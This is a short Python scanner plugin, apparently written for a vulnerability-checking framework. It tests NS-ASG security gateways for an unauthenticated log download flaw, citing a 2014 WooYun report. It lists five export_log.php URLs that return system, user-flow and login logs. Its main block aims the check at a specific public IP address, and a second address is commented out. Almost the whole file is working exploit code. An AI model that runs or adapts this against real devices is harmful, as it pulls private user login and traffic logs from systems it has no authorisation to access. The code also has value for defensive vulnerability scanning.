#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: NS-ASG log File Download
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2014-058932
description:
    https://foobar/admin/export_log.php?type=syslog
    https://foobar/admin/export_log.php?type=userflow
    https://foobar/admin/export_log.php?type=userapp
    https://foobar/admin/export_log.php?type=userlogin
    https://foobar/admin/export_log.php?type=url
'''

def assign(service, arg):
    if service == 'ns-asg':
        return True, arg

def audit(arg):
    payload = arg + 'admin/export_log.php?type=userlogin'
    code, head, res, err, _ = curl.curl2(payload)
    #print res
    if (code==200) and ('客户端IP'.decode('utf-8').encode('gb2312') in res):
        security_hole('Arbitrarily file download: ' + payload)

if __name__ == '__main__':
    from dummy import *
    #audit(assign('ns-asg', 'https://121.28.81.124/')[1])
    audit(assign('ns-asg', 'https://221.214.12.77/')[1])
